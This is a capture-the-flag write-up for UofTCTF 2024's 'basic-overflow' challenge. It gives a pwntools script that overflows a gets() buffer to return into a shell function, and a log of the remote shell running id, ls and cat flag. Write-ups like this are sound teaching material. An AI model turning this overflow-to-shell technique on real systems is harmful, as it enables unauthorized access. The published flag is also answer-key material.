# basic-overflow [316 Solves]

## Description

> This challenge is simple.
>
> It just gets input, stores it to a buffer.
>
> It calls `gets` to read input, stores the read bytes to a buffer, then exits.
>
> What is `gets`, you ask? Well, it's time you read the manual, no?
>
> `man 3 gets`
>
> Cryptic message from author: There are times when you tell them something, but they don't reply. In those cases, you must try again. Don't just shoot one shot; sometimes, they're just not ready yet.
>
> Author: drec
>
> `nc 34.123.15.202 5000`
>
> Attachments: basic-overflow

## Short Solution

Basic ret2win

## Solution

### Basic file checks

```console
$ file basic-overflow
basic-overflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9fa245805d39057f51a0a4155eb71162b48ff682, for GNU/Linux 4.4.0, not stripped

$ checksec basic-overflow
[*] '/root/ctf/UofTCTF_2024/pwn/basic-overflow/basic-overflow'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### solver.py

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./basic-overflow", checksec=False)


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("34.123.15.202", 5000)

    elif args.GDB:
        gdbscript = """
        c
        """
        pty = process.PTY
        io = gdb.debug([elf.path], gdbscript=gdbscript, stdin=pty, stdout=pty)
    else:
        pty = process.PTY
        io = elf.process(stdin=pty, stdout=pty)

    return io


def main():
    payload = b"A" * cyclic_find("saaa")
    payload += p64(elf.sym["shell"])

    io = conn()
    io.sendline(payload)

    io.interactive("")


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py REMOTE
[+] Opening connection to 34.123.15.202 on port 5000: Done
[DEBUG] Sent 0x51 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  36 11 40 00  00 00 00 00  │AAAA│AAAA│6·@·│····│
    00000050  0a                                                  │·│
    00000051
[*] Switching to interactive mode
id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x1e bytes:
    b'uid=1000 gid=1000 groups=1000\n'
uid=1000 gid=1000 groups=1000
ls -la
[DEBUG] Sent 0x7 bytes:
    b'ls -la\n'
[DEBUG] Received 0xd3 bytes:
    b'total 28\n'
    b'drwxr-xr-x 1 nobody nogroup  4096 Jan 12 03:00 .\n'
    b'drwxr-xr-x 1 nobody nogroup  4096 Jan 12 03:00 ..\n'
    b'-r--r--r-- 1 nobody nogroup    37 Jan  9 02:02 flag\n'
    b'-rwxr-xr-x 1 nobody nogroup 15504 Jan  9 02:02 run\n'
total 28
drwxr-xr-x 1 nobody nogroup  4096 Jan 12 03:00 .
drwxr-xr-x 1 nobody nogroup  4096 Jan 12 03:00 ..
-r--r--r-- 1 nobody nogroup    37 Jan  9 02:02 flag
-rwxr-xr-x 1 nobody nogroup 15504 Jan  9 02:02 run
cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x25 bytes:
    b'uoftctf{reading_manuals_is_very_fun}\n'
uoftctf{reading_manuals_is_very_fun}
```

## Flag

uoftctf{reading_manuals_is_very_fun}
